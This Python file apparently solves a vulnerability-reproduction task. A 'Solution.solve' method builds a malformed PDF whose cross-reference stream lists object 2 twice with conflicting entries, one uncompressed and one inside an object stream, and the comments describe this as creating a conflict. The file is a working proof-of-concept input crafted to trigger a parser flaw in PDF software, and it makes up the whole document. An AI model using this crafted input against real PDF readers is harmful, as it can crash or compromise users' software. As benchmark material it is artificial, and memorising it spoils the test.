import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        offsets = {}
        pdf = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        
        # 1: ObjStm
        offsets[1] = len(pdf)
        obj2_content = b"<< /Type /FontDescriptor >>"
        obj3_content = b"<< /Type /Font >>"
        # 2 0 -> obj2_content, 3 0 -> obj3_content
        header = f"2 0 3 {len(obj2_content)} ".encode('ascii')
        data = header + obj2_content + obj3_content
        
        pdf += b"1 0 obj\n"
        pdf += b"<< /Type /ObjStm /N 2 /First " + str(len(header)).encode('ascii') + b" /Length " + str(len(data)).encode('ascii') + b" >>\n"
        pdf += b"stream\n"
        pdf += data + b"\n"
        pdf += b"endstream\n"
        pdf += b"endobj\n"
        
        # 4: Catalog
        offsets[4] = len(pdf)
        pdf += b"4 0 obj\n"
        pdf += b"<< /Type /Catalog /Pages 5 0 R >>\n"
        pdf += b"endobj\n"
        
        # 5: Pages
        offsets[5] = len(pdf)
        pdf += b"5 0 obj\n"
        pdf += b"<< /Type /Pages /Count 1 /Kids [6 0 R] >>\n"
        pdf += b"endobj\n"
        
        # 6: Page (References Obj 2)
        offsets[6] = len(pdf)
        pdf += b"6 0 obj\n"
        pdf += b"<< /Type /Page /Parent 5 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 2 0 R >> >> >>\n"
        pdf += b"endobj\n"
        
        # 7: XRef Stream
        # IDs: 0, 1, 2, 2(dup), 3, 4, 5, 6, 7
        # Index: [0 3 2 1 3 5]
        
        xref_rows = []
        # 0: Free
        xref_rows.append(b'\x00\x00\x00\xff')
        # 1: Type 1 (ObjStm)
        xref_rows.append(b'\x01' + struct.pack('>H', offsets[1]) + b'\x00')
        
        # 2 (First entry): Type 1 (Uncompressed, pointing to offset of Obj 1)
        # This creates ambiguity/conflict for Obj 2
        xref_rows.append(b'\x01' + struct.pack('>H', offsets[1]) + b'\x00')
        
        # 2 (Duplicate): Type 2 (Compressed, in ObjStm 1 at index 0)
        xref_rows.append(b'\x02' + struct.pack('>H', 1) + b'\x00')
        
        # 3: Type 2 (Compressed, in ObjStm 1 at index 1)
        xref_rows.append(b'\x02' + struct.pack('>H', 1) + b'\x01')
        
        # 4, 5, 6 Type 1
        xref_rows.append(b'\x01' + struct.pack('>H', offsets[4]) + b'\x00')
        xref_rows.append(b'\x01' + struct.pack('>H', offsets[5]) + b'\x00')
        xref_rows.append(b'\x01' + struct.pack('>H', offsets[6]) + b'\x00')
        
        # 7 (placeholder)
        xref_rows.append(b'\x01\x00\x00\x00')
        
        offsets[7] = len(pdf)
        xref_rows[-1] = b'\x01' + struct.pack('>H', offsets[7]) + b'\x00'
        
        stm_content = b"".join(xref_rows)
        
        pdf += b"7 0 obj\n"
        pdf += b"<< /Type /XRef /Size 8 /W [1 2 1] /Root 4 0 R /Index [0 3 2 1 3 5] /Length " + str(len(stm_content)).encode('ascii') + b" >>\n"
        pdf += b"stream\n"
        pdf += stm_content + b"\n"
        pdf += b"endstream\n"
        pdf += b"endobj\n"
        
        pdf += b"startxref\n"
        pdf += str(offsets[7]).encode('ascii') + b"\n"
        pdf += b"%%EOF\n"
        
        return pdf
